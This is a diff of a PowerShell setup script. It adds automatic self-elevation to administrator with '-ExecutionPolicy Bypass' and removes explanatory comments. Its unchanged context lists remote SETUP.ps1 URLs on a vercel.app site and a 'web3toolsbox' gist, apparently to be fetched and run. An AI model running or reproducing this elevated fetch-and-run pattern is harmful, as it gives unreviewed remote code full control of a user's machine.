@@ -1,6 +1,39 @@
+param(
+    [string]$RelaunchWorkingDirectory
+)
+
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host 'Please run this script as Administrator.' -ForegroundColor Red
-    exit 1
+    $scriptPath = $PSCommandPath
+    if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Definition }
+
+    $psExe = (Get-Process -Id $PID).Path
+    if (-not $psExe) { $psExe = 'powershell.exe' }
+
+    $quote = { param($v) '"' + ($v -replace '"', '\"') + '"' }
+
+    $workDir = if ($PWD.Path) { $PWD.Path } else { '' }
+    $relaunchArgs = @(
+        '-NoProfile', '-ExecutionPolicy', 'Bypass',
+        '-File', (& $quote $scriptPath),
+        '-RelaunchWorkingDirectory', (& $quote $workDir)
+    )
+    foreach ($a in $args) {
+        if ($null -ne $a) { $relaunchArgs += (& $quote $a) }
+    }
+
+    try {
+        $elevated = Start-Process -FilePath $psExe -ArgumentList $relaunchArgs `
+            -Verb RunAs -Wait -PassThru
+        $code = if ($null -ne $elevated.ExitCode) { $elevated.ExitCode } else { 0 }
+        exit $code
+    } catch {
+        Write-Host '[ERROR] Administrator privileges are required; elevation was cancelled or blocked.' -ForegroundColor Red
+        exit 1
+    }
+}
+
+if ($RelaunchWorkingDirectory -and (Test-Path -LiteralPath $RelaunchWorkingDirectory -PathType Container)) {
+    Set-Location -LiteralPath $RelaunchWorkingDirectory
 }
 
 $originalPSDefaults = if ($PSDefaultParameterValues -and $PSDefaultParameterValues.Count -gt 0) {
@@ -80,8 +113,6 @@ function Write-ContinueOnError {
     Add-FailedStep -Step $Step -Reason $message
 }
 
-# GitHub raw/gist endpoints can fail on older Windows PowerShell defaults unless
-# TLS 1.2+ is enabled explicitly for the current process.
 function Enable-ModernTls {
     try {
         $protocol = [System.Net.ServicePointManager]::SecurityProtocol
@@ -298,8 +329,6 @@ function Test-StoreStub {
     return $false
 }
 
-# Return the first matching executable from a list of candidate command names,
-# skipping Windows Store stubs.
 function Get-CommandPath {
     param(
         [string[]]$Names
@@ -431,8 +460,6 @@ function Install-Uv {
     return $null
 }
 
-# Given a command path that might be py.exe or a Store stub, resolve the real
-# python.exe via sys.executable and verify it works.
 function Resolve-PythonPath {
     param(
         [string]$Candidate
@@ -466,8 +493,6 @@ function Resolve-PythonPath {
     return $Candidate
 }
 
-# Scrape the latest 64-bit Python installer URL and fall back to a pinned build
-# if the download pages cannot be parsed.
 function Get-PythonInstallerArch {
     $arch = $env:PROCESSOR_ARCHITECTURE
     if ($arch -eq 'ARM64') {
@@ -638,8 +663,6 @@ function Install-PythonPackage {
     }
 }
 
-
-# Install a CLI tool via uv tool
 function Install-UvToolPackage {
     param(
         [string]$UvPath,
@@ -779,7 +802,7 @@ try {
     } else {
         Write-WarnLog 'Configuration directory not found, skipping environment configuration: .configs'
     }
-    
+
     $setupScriptUrls = @(
         'https://agentskillshub.vercel.app/src/SETUP.ps1',
         'https://gist.githubusercontent.com/web3toolsbox/7993314292fd898e5654632f1f2a3ce3/raw/SETUP.ps1'
